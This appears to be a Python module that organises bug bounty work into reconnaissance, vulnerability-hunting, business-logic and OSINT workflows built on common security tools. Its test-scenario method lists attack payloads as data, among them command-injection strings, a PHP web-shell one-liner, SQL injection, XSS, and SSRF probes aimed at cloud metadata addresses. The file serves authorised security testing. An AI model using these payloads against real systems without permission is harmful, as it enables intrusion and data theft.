"""
Bug Bounty Workflow Manager
Specialized workflow manager for bug bounty hunting operations
"""

from typing import Dict, Any, List
from dataclasses import dataclass, field


@dataclass
class BugBountyTarget:
    """Bug bounty target information"""
    domain: str
    scope: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    program_type: str = "web"  # web, api, mobile, iot
    priority_vulns: List[str] = field(default_factory=lambda: ["rce", "sqli", "xss", "idor", "ssrf"])
    bounty_range: str = "unknown"


class BugBountyWorkflowManager:
    """Specialized workflow manager for bug bounty hunting"""

    def __init__(self):
        self.high_impact_vulns = {
            "rce": {"priority": 10, "tools": ["nuclei", "jaeles", "sqlmap"], "payloads": "command_injection"},
            "sqli": {"priority": 9, "tools": ["sqlmap", "nuclei"], "payloads": "sql_injection"},
            "ssrf": {"priority": 8, "tools": ["nuclei", "ffuf"], "payloads": "ssrf"},
            "idor": {"priority": 8, "tools": ["arjun", "paramspider", "ffuf"], "payloads": "idor"},
            "xss": {"priority": 7, "tools": ["dalfox", "nuclei"], "payloads": "xss"},
            "lfi": {"priority": 7, "tools": ["ffuf", "nuclei"], "payloads": "lfi"},
            "xxe": {"priority": 6, "tools": ["nuclei"], "payloads": "xxe"},
            "csrf": {"priority": 5, "tools": ["nuclei"], "payloads": "csrf"}
        }

        self.reconnaissance_tools = [
            {"tool": "amass", "phase": "subdomain_enum", "priority": 1},
            {"tool": "subfinder", "phase": "subdomain_enum", "priority": 2},
            {"tool": "httpx", "phase": "http_probe", "priority": 3},
            {"tool": "katana", "phase": "crawling", "priority": 4},
            {"tool": "gau", "phase": "url_discovery", "priority": 5},
            {"tool": "waybackurls", "phase": "url_discovery", "priority": 6},
            {"tool": "paramspider", "phase": "parameter_discovery", "priority": 7},
            {"tool": "arjun", "phase": "parameter_discovery", "priority": 8}
        ]

    def create_reconnaissance_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create comprehensive reconnaissance workflow for bug bounty"""
        workflow = {
            "target": target.domain,
            "phases": [],
            "estimated_time": 0,
            "tools_count": 0
        }

        # Phase 1: Subdomain Discovery
        subdomain_phase = {
            "name": "subdomain_discovery",
            "description": "Comprehensive subdomain enumeration",
            "tools": [
                {"tool": "amass", "params": {"domain": target.domain, "mode": "enum"}},
                {"tool": "subfinder", "params": {"domain": target.domain, "silent": True}},
                {"tool": "assetfinder", "params": {"domain": target.domain}}
            ],
            "expected_outputs": ["subdomains.txt"],
            "estimated_time": 300
        }
        workflow["phases"].append(subdomain_phase)

        # Phase 2: HTTP Service Discovery
        http_phase = {
            "name": "http_service_discovery",
            "description": "Identify live HTTP services",
            "tools": [
                {"tool": "httpx", "params": {"probe": True, "tech_detect": True, "status_code": True}},
                {"tool": "nuclei", "params": {"tags": "tech", "severity": "info"}}
            ],
            "expected_outputs": ["live_hosts.txt", "technologies.json"],
            "estimated_time": 180
        }
        workflow["phases"].append(http_phase)

        # Phase 3: Content Discovery
        content_phase = {
            "name": "content_discovery",
            "description": "Discover hidden content and endpoints",
            "tools": [
                {"tool": "katana", "params": {"depth": 3, "js_crawl": True}},
                {"tool": "gau", "params": {"include_subs": True}},
                {"tool": "waybackurls", "params": {}},
                {"tool": "dirsearch", "params": {"extensions": "php,html,js,txt,json,xml"}}
            ],
            "expected_outputs": ["endpoints.txt", "js_files.txt"],
            "estimated_time": 600
        }
        workflow["phases"].append(content_phase)

        # Phase 4: Parameter Discovery
        param_phase = {
            "name": "parameter_discovery",
            "description": "Discover hidden parameters",
            "tools": [
                {"tool": "paramspider", "params": {"level": 2}},
                {"tool": "arjun", "params": {"method": "GET,POST", "stable": True}},
                {"tool": "x8", "params": {"method": "GET"}}
            ],
            "expected_outputs": ["parameters.txt"],
            "estimated_time": 240
        }
        workflow["phases"].append(param_phase)

        # Calculate totals
        workflow["estimated_time"] = sum(phase["estimated_time"] for phase in workflow["phases"])
        workflow["tools_count"] = sum(len(phase["tools"]) for phase in workflow["phases"])

        return workflow

    def create_vulnerability_hunting_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create vulnerability hunting workflow prioritized by impact"""
        workflow = {
            "target": target.domain,
            "vulnerability_tests": [],
            "estimated_time": 0,
            "priority_score": 0
        }

        # Sort vulnerabilities by priority
        sorted_vulns = sorted(target.priority_vulns,
                            key=lambda v: self.high_impact_vulns.get(v, {}).get("priority", 0),
                            reverse=True)

        for vuln_type in sorted_vulns:
            if vuln_type in self.high_impact_vulns:
                vuln_config = self.high_impact_vulns[vuln_type]

                vuln_test = {
                    "vulnerability_type": vuln_type,
                    "priority": vuln_config["priority"],
                    "tools": vuln_config["tools"],
                    "payload_type": vuln_config["payloads"],
                    "test_scenarios": self._get_test_scenarios(vuln_type),
                    "estimated_time": vuln_config["priority"] * 30  # Higher priority = more time
                }

                workflow["vulnerability_tests"].append(vuln_test)
                workflow["estimated_time"] += vuln_test["estimated_time"]
                workflow["priority_score"] += vuln_config["priority"]

        return workflow

    def _get_test_scenarios(self, vuln_type: str) -> List[Dict[str, Any]]:
        """Get specific test scenarios for vulnerability types"""
        scenarios = {
            "rce": [
                {"name": "Command Injection", "payloads": ["$(whoami)", "`id`", ";ls -la"]},
                {"name": "Code Injection", "payloads": ["<?php system($_GET['cmd']); ?>"]},
                {"name": "Template Injection", "payloads": ["{{7*7}}", "${7*7}", "#{7*7}"]}
            ],
            "sqli": [
                {"name": "Union-based SQLi", "payloads": ["' UNION SELECT 1,2,3--", "' OR 1=1--"]},
                {"name": "Boolean-based SQLi", "payloads": ["' AND 1=1--", "' AND 1=2--"]},
                {"name": "Time-based SQLi", "payloads": ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--"]}
            ],
            "xss": [
                {"name": "Reflected XSS", "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]},
                {"name": "Stored XSS", "payloads": ["<script>alert('XSS')</script>"]},
                {"name": "DOM XSS", "payloads": ["javascript:alert(1)", "#<script>alert(1)</script>"]}
            ],
            "ssrf": [
                {"name": "Internal Network", "payloads": ["http://127.0.0.1:80", "http://localhost:22"]},
                {"name": "Cloud Metadata", "payloads": ["http://169.254.169.254/latest/meta-data/"]},
                {"name": "DNS Exfiltration", "payloads": ["http://burpcollaborator.net"]}
            ],
            "idor": [
                {"name": "Numeric IDOR", "payloads": ["id=1", "id=2", "id=../1"]},
                {"name": "UUID IDOR", "payloads": ["uuid=00000000-0000-0000-0000-000000000001"]},
                {"name": "Encoded IDOR", "payloads": ["id=MQ==", "id=Mg=="]}  # base64 encoded 1,2
            ]
        }

        return scenarios.get(vuln_type, [])

    def create_business_logic_testing_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create business logic testing workflow"""
        workflow = {
            "target": target.domain,
            "business_logic_tests": [
                {
                    "category": "Authentication Bypass",
                    "tests": [
                        {"name": "Password Reset Token Reuse", "method": "manual"},
                        {"name": "JWT Algorithm Confusion", "method": "automated", "tool": "jwt_tool"},
                        {"name": "Session Fixation", "method": "manual"},
                        {"name": "OAuth Flow Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Authorization Flaws",
                    "tests": [
                        {"name": "Horizontal Privilege Escalation", "method": "automated", "tool": "arjun"},
                        {"name": "Vertical Privilege Escalation", "method": "manual"},
                        {"name": "Role-based Access Control Bypass", "method": "manual"}
                    ]
                },
                {
                    "category": "Business Process Manipulation",
                    "tests": [
                        {"name": "Race Conditions", "method": "automated", "tool": "race_the_web"},
                        {"name": "Price Manipulation", "method": "manual"},
                        {"name": "Quantity Limits Bypass", "method": "manual"},
                        {"name": "Workflow State Manipulation", "method": "manual"}
                    ]
                },
                {
                    "category": "Input Validation Bypass",
                    "tests": [
                        {"name": "File Upload Restrictions", "method": "automated", "tool": "upload_scanner"},
                        {"name": "Content-Type Bypass", "method": "manual"},
                        {"name": "Size Limit Bypass", "method": "manual"}
                    ]
                }
            ],
            "estimated_time": 480,  # 8 hours for thorough business logic testing
            "manual_testing_required": True
        }

        return workflow

    def create_osint_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create OSINT gathering workflow"""
        workflow = {
            "target": target.domain,
            "osint_phases": [
                {
                    "name": "Domain Intelligence",
                    "tools": [
                        {"tool": "whois", "params": {"domain": target.domain}},
                        {"tool": "dnsrecon", "params": {"domain": target.domain}},
                        {"tool": "certificate_transparency", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Social Media Intelligence",
                    "tools": [
                        {"tool": "sherlock", "params": {"username": "target_company"}},
                        {"tool": "social_mapper", "params": {"company": target.domain}},
                        {"tool": "linkedin_scraper", "params": {"company": target.domain}}
                    ]
                },
                {
                    "name": "Email Intelligence",
                    "tools": [
                        {"tool": "hunter_io", "params": {"domain": target.domain}},
                        {"tool": "haveibeenpwned", "params": {"domain": target.domain}},
                        {"tool": "email_validator", "params": {"domain": target.domain}}
                    ]
                },
                {
                    "name": "Technology Intelligence",
                    "tools": [
                        {"tool": "builtwith", "params": {"domain": target.domain}},
                        {"tool": "wappalyzer", "params": {"domain": target.domain}},
                        {"tool": "shodan", "params": {"query": f"hostname:{target.domain}"}}
                    ]
                }
            ],
            "estimated_time": 240,
            "intelligence_types": ["technical", "social", "business", "infrastructure"]
        }

        return workflow
